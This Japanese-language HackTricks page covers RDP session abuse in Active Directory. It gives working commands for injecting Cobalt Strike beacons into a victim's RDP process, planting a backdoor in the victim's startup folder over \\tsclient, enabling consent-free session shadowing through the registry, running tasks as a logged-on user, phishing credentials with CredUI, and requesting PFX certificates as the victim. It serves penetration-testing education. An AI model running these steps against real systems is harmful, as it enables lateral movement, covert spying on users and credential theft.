# RDPセッションの悪用

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

**外部グループ**が現在のドメイン内の**コンピューター**に対する**RDPアクセス権**を持っている場合、そのコンピューターを侵害した攻撃者は、グループのメンバーが接続してくるのを待つことができます。

ユーザーがRDP経由で接続すると、**攻撃者はそのユーザーのセッションにピボット**し、外部ドメインにおけるユーザーの権限を悪用できます。

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

別のツールを使ってセッションを盗む**他の方法**については、[**このページ**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)を確認してください。

## セッション間認証リレー

別のドメインユーザーが使用している**アクティブなコンソールまたはRDPセッション**は、同じホスト上で低い権限のシェルを持っている場合、足掛かりにもなります。DCOMのセッション間アクティベーションにより、その対話型セッション内の適切なCOMサーバーに認証を行わせることができ、RemotePotato0やKrbRelayなどのツールでその認証をキャプチャまたはリレーできます。ログオン中のユーザーがドメイン管理者である必要はありません。たとえば、gMSAの管理パスワードを読み取る権限など、範囲が限定されたディレクトリ権限だけでも、さらなるピボットに十分な場合があります。<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

まず、`query user`、`qwinsta`、または既存のwinPEASセッション一覧からセッションIDとユーザーを確認します。これらはリレー経路の**候補**であり、リレー可能であることの証明ではありません。COMクラス、偽装レベルと認証レベル、セッションへのアクセス可否、ファイアウォール/OXIDルーティング、ターゲットプロトコルの保護、ログオン中のプリンシパルの実効権限など、すべてが影響します。KrbRelayのドキュメントには、セッション間のLDAP、HTTP、SMB、NTLMの例がありますが、これらの経路はバージョンや設定に依存します。LDAPチャネルバインディングも、ターゲット側でリレーを阻止する要因です。特に、RemotePotato0プロジェクトによると、当初のRPCからLDAPへのエクスプロイトシナリオは2022年に修正されました。セッションが見えているだけでLDAPリレーが成功すると判断しないでください。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

ユーザーが**攻撃者の待ち受けている**マシンに**RDPでアクセス**すると、攻撃者は**ユーザーのRDPセッションにbeaconをインジェクト**できます。また、被害者がRDPでアクセスした際に**ドライブをマウントしていれば**、**攻撃者はそのドライブにアクセスできます**。

この場合、**スタートアップフォルダー**に**バックドア**を書き込むだけで、**被害者の元のコンピューター**を**侵害**できます。

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

被害者がすでに**アクティブなRDPセッション**を持つホストで**local admin**であれば、**パスワードを盗んだりLSASSをダンプしたりせずに、そのデスクトップを表示・操作できる**可能性があります。<sup>[[1]](#references)</sup>

これは、次の場所に保存されている**Remote Desktop Services shadowing**ポリシーに依存します。<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

興味深い値:

- `0`: 無効
- `1`: `EnableInputNotify`（制御、ユーザーの承認が必要）
- `2`: `EnableInputNoNotify`（制御、**ユーザーの承認不要**）
- `3`: `EnableNoInputNotify`（閲覧のみ、ユーザーの承認が必要）
- `4`: `EnableNoInputNoNotify`（閲覧のみ、**ユーザーの承認不要**）

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

これは、RDP 経由で接続した特権ユーザーが、ロックされていないデスクトップ、KeePass セッション、MMC コンソール、ブラウザーセッション、または admin shell を開いたままにしている場合に特に有用です。

## ログオン中のユーザーとしてのスケジュールされたタスク

あなたが**ローカル admin**で、対象ユーザーが**現在ログオン中**の場合、タスク スケジューラを使えば、そのユーザーのパスワードなしで、そのユーザーとしてコードを起動できます。<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

これにより、被害者の既存のログオンセッションを実行プリミティブとして利用できます。

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

メモ:

- ユーザーが**ログオンしていない**場合、Windowsでは通常、そのユーザーとして実行するタスクを作成するためにパスワードが必要です。
- ユーザーが**ログオンしている**場合、タスクは既存のログオンコンテキストを再利用できます。
- これは、LSASSに触れずに被害者のセッション内でGUI操作を実行したり、バイナリを起動したりする実用的な方法です。

## 被害者セッションからのCredUIプロンプト悪用

**Shadow RDP**や**そのユーザーとして実行するスケジュールされたタスク**などを使って、**被害者の対話型デスクトップ内で実行**できるようになったら、CredUI APIを使って**本物のWindows資格情報プロンプト**を表示し、被害者が入力した資格情報を取得できます。<sup>[[1]](#references)</sup>

関連API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

一般的な流れ:

1. 被害者のセッションでバイナリを起動する。
2. 現在のドメインのブランディングに合ったドメイン認証プロンプトを表示する。
3. 返された認証バッファを展開する。
4. 入力された資格情報を検証し、正しい資格情報が入力されるまで必要に応じてプロンプトを繰り返す。

プロンプトは偽のHTMLフォームではなく標準のWindows APIによって表示されるため、これは**ホスト上でのフィッシング**に有効です。

## 被害者のコンテキストでPFXを要求する

同じ**ユーザーとしてのスケジュールされたタスク**というプリミティブを使って、ログオン中の被害者として**証明書/PFX**を要求できます。その証明書は後でそのユーザーとしての**AD認証**に使用でき、パスワード窃取を完全に回避できます。<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

大まかな流れ:

1. 被害者がログオンしているホストで**local admin**権限を取得する。
2. **スケジュールされたタスク**を使って、被害者として証明書の登録/エクスポート処理を実行する。
3. 生成された**PFX**をエクスポートする。
4. PFXをPKINIT / 証明書ベースのAD認証に使用する。

悪用の続きについては、AD CSのページを参照してください。

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - フラットなネットワークから、ティアリングモデルによるロックダウンされたドメインへ](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – `mstsc`のシャドウセッションオプション](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Shadow RDPプラグインのPR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_asモジュール](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - スケジュールされたタスク経由でPFXを要求するPR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - セッション間のDCOMアクティベーションと現在の制限事項](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - セッション間リレーの例とCLSIDの要件](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - query sessionコマンド](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - ms-DS-GroupMSAMembership属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAPチャネルバインディングとリレー対策](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
